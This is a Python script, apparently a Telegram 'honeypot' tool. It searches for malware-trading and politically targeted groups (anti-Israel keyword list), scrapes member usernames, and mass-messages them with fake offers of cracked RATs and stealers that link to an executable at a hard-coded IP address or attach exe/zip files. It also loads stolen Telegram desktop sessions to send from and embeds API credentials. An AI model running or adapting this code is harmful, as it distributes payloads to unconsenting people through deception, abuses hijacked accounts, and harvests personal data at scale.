"""
Telegram Honeypot Scanner + Auto-Distributor
Finds threat actors → auto-DMs them honeypot payloads

Menu:
  1. Full scan       — find threat actor groups/channels
  2. Quick scan      — core 10 tags only
  3. Group scrape    — dump members from found groups
  4. Auto-distribute — DM scraped members with honeypot
  5. Load tdata      — use stolen Telegram session for sending

Setup:
  pip install telethon opentele
"""

import asyncio
import json
import random
import getpass
import os
from telethon import TelegramClient
from telethon.tl.functions.messages import SearchGlobalRequest
from telethon.tl.functions.contacts import SearchRequest as ContactsSearch
from telethon.tl.functions.channels import GetParticipantsRequest
from telethon.tl.types import InputMessagesFilterEmpty, InputPeerEmpty, ChannelParticipantsSearch
from telethon.errors import FloodWaitError, UserPrivacyRestrictedError, PeerFloodError

# ── ACCOUNTS ─────────────────────────────────────────────────────────────────
SCANNER = {
    "api_id": 35473324,
    "api_hash": "d6b1b6d25c05a8326cb3e798fcae1f16",
    "session": "scanner_session"
}

SENDER = {
    "api_id": 30424826,
    "api_hash": "ef4bf026f3f9789a901456837876be40",
    "session": "sender_session"
}

# ── KEYWORDS ─────────────────────────────────────────────────────────────────
CORE_TERMS = [
    "#RAT", "#RemoteTool", "#HackerTools", "#LifetimeAccess",
    "#Stealer", "#Crypter", "#Bypass", "#CyberTools", "#Logger", "#Keylogger",
]

ALL_TERMS = CORE_TERMS + [
    "#Malware", "#Spyware", "#Botnet", "#FUD", "#Undetected",
    "#C2", "#Payload", "#Dropper", "#InfoStealer", "#PrivateTools",
    "#Exploit", "#Shell", "#Backdoor", "#Ransomware", "#Phishing",
    "AsyncRAT", "DCRat", "RedLine", "Raccoon", "Vidar", "LummaC2",
    "EagleSpy", "NjRAT", "QuasarRAT", "XWorm", "Remcos", "AgentTesla",
]

# Anti-Israel extremist keywords (for IL database honeypot)
EXTREMIST_TERMS = [
    "#OpIsrael", "#FreePalestine", "#AlAqsa", "#Resistance",
    "Israel leak", "Israel database", "Israel hack", "IDF leak",
    "Zionist", "مقاومة", "القسام", "حماس",
    "#Anonymous", "#GhostSec", "#AnonGhost",
    "Israeli data", "Israel doxx", "IDF data",
    "#CyberIntifada", "#ElectronicIntifada",
]

# ── OUTPUT FILES ─────────────────────────────────────────────────────────────
OUTPUT_JSON     = "osint_results.json"
OUTPUT_CHANNELS = "osint_channels.txt"
OUTPUT_GROUPS   = "osint_groups.txt"
OUTPUT_MEMBERS  = "osint_members.json"
SENT_LOG        = "sent_log.txt"

# ── HONEYPOT CONFIG ──────────────────────────────────────────────────────────
HONEYPOT_MESSAGES = [
    "yo bro check this RAT i cracked, FUD bypass works on win11 💀\n{url}",
    "selling cheap, this stealer grabs discord tokens + crypto wallets\n{url}",
    "free tool for testing, works good 🔥\n{url}",
    "my private crypter, makes any rat undetected\n{url}",
]

DEFAULT_PAYLOAD_URL = "http://168.144.166.97:8081/PSHost.exe"


# ── HELPERS ──────────────────────────────────────────────────────────────────

def chat_type(chat):
    if getattr(chat, 'megagroup', False):
        return "group"
    if getattr(chat, 'broadcast', False):
        return "channel"
    return "group"


def load_sent():
    try:
        with open(SENT_LOG, "r") as f:
            return set(line.strip() for line in f if line.strip())
    except FileNotFoundError:
        return set()


def log_sent(user_id):
    with open(SENT_LOG, "a") as f:
        f.write(f"{user_id}\n")


def load_members():
    try:
        with open(OUTPUT_MEMBERS, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"[!] {OUTPUT_MEMBERS} not found - run group scrape first (option 3)")
        return []


# ── SEARCH ───────────────────────────────────────────────────────────────────

async def search_term(client, term, max_pages=10):
    print(f"\n[*] Searching: {term}")
    hits = []
    offset_rate = 0
    offset_peer = InputPeerEmpty()
    offset_id = 0
    page = 0

    while page < max_pages:
        try:
            results = await client(SearchGlobalRequest(
                q=term,
                filter=InputMessagesFilterEmpty(),
                min_date=None, max_date=None,
                offset_rate=offset_rate,
                offset_peer=offset_peer,
                offset_id=offset_id,
                limit=100
            ))
        except Exception as e:
            print(f"  [!] Error: {e}")
            break

        if not results.messages:
            break

        chat_map = {c.id: c for c in results.chats}

        for msg in results.messages:
            try:
                peer = msg.peer_id
                chat = None
                if hasattr(peer, 'channel_id'):
                    chat = chat_map.get(peer.channel_id)
                elif hasattr(peer, 'chat_id'):
                    chat = chat_map.get(peer.chat_id)

                hit = {
                    "term": term,
                    "type": chat_type(chat) if chat else "unknown",
                    "channel_id": chat.id if chat else None,
                    "channel_name": getattr(chat, "title", None) if chat else None,
                    "channel_username": getattr(chat, "username", None) if chat else None,
                }
                if hit["channel_username"]:
                    hit["channel_link"] = f"https://t.me/{hit['channel_username']}"
                    hits.append(hit)
                    print(f"  HIT [{hit['type'][:4]}] → {hit['channel_link']}")
            except:
                pass

        next_rate = getattr(results, 'next_rate', None)
        if not next_rate:
            break
        offset_rate = next_rate
        page += 1
        await asyncio.sleep(1)

    return hits


async def search_channels_by_name(client, term):
    found = []
    try:
        q = term.lstrip("#")
        results = await client(ContactsSearch(q=q, limit=100))
        for chat in results.chats:
            username = getattr(chat, "username", None)
            if username:
                found.append({
                    "term": term,
                    "type": chat_type(chat),
                    "channel_id": chat.id,
                    "channel_name": getattr(chat, "title", None),
                    "channel_username": username,
                    "channel_link": f"https://t.me/{username}",
                })
                print(f"  CHAN [{chat_type(chat)[:4]}] → https://t.me/{username}")
    except Exception as e:
        print(f"  [!] {e}")
    return found


async def run_scan(client, terms, max_pages=10):
    all_hits = []
    seen_channels = set()
    seen_groups = set()

    for term in terms:
        hits = await search_term(client, term, max_pages=max_pages)
        all_hits.extend(hits)
        for h in hits:
            link = h.get("channel_link")
            if link:
                (seen_groups if h["type"] == "group" else seen_channels).add(link)
        await asyncio.sleep(2)

        chan_hits = await search_channels_by_name(client, term)
        all_hits.extend(chan_hits)
        for h in chan_hits:
            link = h.get("channel_link")
            if link:
                (seen_groups if h["type"] == "group" else seen_channels).add(link)
        await asyncio.sleep(2)

    # Save
    with open(OUTPUT_JSON, "w") as f:
        json.dump(all_hits, f, indent=2)
    with open(OUTPUT_CHANNELS, "w") as f:
        f.write("\n".join(sorted(seen_channels)))
    with open(OUTPUT_GROUPS, "w") as f:
        f.write("\n".join(sorted(seen_groups)))

    print(f"\n[+] Channels: {len(seen_channels)} → {OUTPUT_CHANNELS}")
    print(f"[+] Groups: {len(seen_groups)} → {OUTPUT_GROUPS}")


# ── GROUP SCRAPE ─────────────────────────────────────────────────────────────

async def run_group_scrape(client):
    try:
        with open(OUTPUT_GROUPS, "r") as f:
            links = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        print(f"[!] {OUTPUT_GROUPS} not found - run scan first")
        return

    print(f"\n[*] Scraping {len(links)} groups...")
    all_members = []

    for link in links:
        username = link.rstrip("/").split("/")[-1]
        print(f"  {link}")
        offset = 0
        count = 0

        while True:
            try:
                participants = await client(GetParticipantsRequest(
                    channel=username,
                    filter=ChannelParticipantsSearch(''),
                    offset=offset,
                    limit=200,
                    hash=0
                ))
                if not participants.users:
                    break

                for u in participants.users:
                    if not u.bot and u.username:
                        all_members.append({
                            "group": link,
                            "user_id": u.id,
                            "username": u.username,
                            "first_name": getattr(u, "first_name", None),
                        })
                count += len(participants.users)
                offset += len(participants.users)
                await asyncio.sleep(1)
            except Exception as e:
                print(f"    [!] {e}")
                break

        print(f"    → {count} members")
        await asyncio.sleep(3)

    with open(OUTPUT_MEMBERS, "w") as f:
        json.dump(all_members, f, indent=2)

    print(f"\n[+] {len(all_members)} members saved → {OUTPUT_MEMBERS}")


# ── AUTO-DISTRIBUTE ──────────────────────────────────────────────────────────

async def run_distribute(client, mode="link", payload_url=None, file_path=None, forward_msg=None):
    members = load_members()
    if not members:
        return

    sent = load_sent()
    to_send = [m for m in members if str(m["user_id"]) not in sent]

    print(f"\n[*] {len(to_send)} targets ({len(sent)} already sent)")

    if not to_send:
        print("[!] Everyone already contacted")
        return

    success = 0
    failed = 0

    for m in to_send:
        username = m["username"]

        try:
            if mode == "forward" and forward_msg:
                # Forward your premade message
                await client.forward_messages(username, forward_msg["id"], forward_msg["chat"])
                print(f"  [+] Forwarded → @{username}")

            elif mode == "file" and file_path:
                # Send file with caption
                caption = random.choice(HONEYPOT_MESSAGES).format(url="").strip()
                await client.send_file(username, file_path, caption=caption)
                print(f"  [+] Sent file → @{username}")

            else:
                # Default: send link message
                url = payload_url or DEFAULT_PAYLOAD_URL
                msg = random.choice(HONEYPOT_MESSAGES).format(url=url)
                await client.send_message(username, msg)
                print(f"  [+] Sent → @{username}")

            log_sent(m["user_id"])
            success += 1

            # Random delay 30-120s to avoid flood
            delay = random.randint(30, 120)
            print(f"      waiting {delay}s...")
            await asyncio.sleep(delay)

        except FloodWaitError as e:
            print(f"  [!] Flood wait {e.seconds}s - stopping")
            break
        except PeerFloodError:
            print(f"  [!] Peer flood - Telegram limiting, stopping")
            break
        except UserPrivacyRestrictedError:
            print(f"  [-] @{username} - privacy restricted")
            log_sent(m["user_id"])  # Don't retry
            failed += 1
        except Exception as e:
            print(f"  [-] @{username} - {e}")
            failed += 1

    print(f"\n[+] Sent: {success} | Failed: {failed}")


async def get_template_message(client):
    """Get a message to forward - from Saved Messages or a channel"""
    print("\n[*] Template message setup:")
    print("  1. Use message from Saved Messages")
    print("  2. Use message from a channel/group")

    choice = input("Select [1-2]: ").strip()

    if choice == "1":
        # Saved Messages
        print("\n[*] Send your template message to Saved Messages first")
        print("[*] Then enter the message ID (right-click → Copy Message Link → last number)")
        msg_id = input("Message ID: ").strip()
        if msg_id.isdigit():
            return {"chat": "me", "id": int(msg_id)}

    elif choice == "2":
        # Channel/group
        chat = input("Channel/group username (without @): ").strip()
        msg_id = input("Message ID: ").strip()
        if msg_id.isdigit():
            return {"chat": chat, "id": int(msg_id)}

    return None


# ── TDATA LOADER ─────────────────────────────────────────────────────────────

async def load_tdata_session():
    try:
        from opentele.td import TDesktop
        from opentele.api import UseCurrentSession
    except ImportError:
        print("[!] Install opentele: pip install opentele")
        return None

    tdata_path = input("tdata folder path: ").strip()
    if not os.path.exists(tdata_path):
        print(f"[!] Path not found: {tdata_path}")
        return None

    try:
        tdesk = TDesktop(tdata_path)
        client = await tdesk.ToTelethon(
            session="tdata_session",
            flag=UseCurrentSession
        )
        print("[+] tdata session loaded → tdata_session.session")
        return client
    except Exception as e:
        print(f"[!] Failed: {e}")
        return None


# ── MAIN ─────────────────────────────────────────────────────────────────────

async def main():
    print("=" * 60)
    print("  TELEGRAM HONEYPOT SCANNER")
    print("=" * 60)
    print("  1. Full scan       — RAT/stealer groups (cybercriminals)")
    print("  2. Quick scan      — 10 core tags only")
    print("  3. Extremist scan  — anti-Israel/hacktivists")
    print("  4. Group scrape    — dump members to JSON")
    print("  5. Auto-distribute — DM honeypot to members")
    print("  6. Load tdata      — use stolen session for sending")
    print("=" * 60)

    choice = input("Select [1-6]: ").strip()

    if choice in ("1", "2", "3", "4"):
        # Use scanner account
        client = TelegramClient(
            SCANNER["session"],
            SCANNER["api_id"],
            SCANNER["api_hash"]
        )
        await client.start(
            phone=lambda: getpass.getpass("Scanner phone: "),
            code_callback=lambda: getpass.getpass("Code: "),
            password=lambda: getpass.getpass("2FA: "),
        )

        async with client:
            me = await client.get_me()
            print(f"\n[*] Scanner: {me.first_name} (@{me.username})\n")

            if choice == "1":
                await run_scan(client, ALL_TERMS, max_pages=10)
            elif choice == "2":
                await run_scan(client, CORE_TERMS, max_pages=1)
            elif choice == "3":
                await run_scan(client, EXTREMIST_TERMS, max_pages=10)
            elif choice == "4":
                await run_group_scrape(client)

    elif choice == "5":
        # Use sender account
        print("\n[*] Distribution mode:")
        print("  1. Link only      — send message with payload URL")
        print("  2. Forward        — forward your premade template message")
        print("  3. Attachment     — send file (exe/zip) with caption")

        mode_choice = input("Select [1-3]: ").strip()

        client = TelegramClient(
            SENDER["session"],
            SENDER["api_id"],
            SENDER["api_hash"]
        )
        await client.start(
            phone=lambda: getpass.getpass("Sender phone: "),
            code_callback=lambda: getpass.getpass("Code: "),
            password=lambda: getpass.getpass("2FA: "),
        )

        async with client:
            me = await client.get_me()
            print(f"\n[*] Sender: {me.first_name} (@{me.username})\n")

            if mode_choice == "1":
                url = input(f"Payload URL [{DEFAULT_PAYLOAD_URL}]: ").strip()
                url = url or DEFAULT_PAYLOAD_URL
                await run_distribute(client, mode="link", payload_url=url)

            elif mode_choice == "2":
                forward_msg = await get_template_message(client)
                if forward_msg:
                    await run_distribute(client, mode="forward", forward_msg=forward_msg)
                else:
                    print("[!] Invalid template message")

            elif mode_choice == "3":
                file_path = input("File path (exe/zip): ").strip()
                if os.path.exists(file_path):
                    await run_distribute(client, mode="file", file_path=file_path)
                else:
                    print(f"[!] File not found: {file_path}")

    elif choice == "6":
        client = await load_tdata_session()
        if client:
            async with client:
                me = await client.get_me()
                print(f"[+] Logged in as: {me.first_name} (@{me.username})")
                print("[*] Session saved - use option 5 with this session")


if __name__ == "__main__":
    asyncio.run(main())
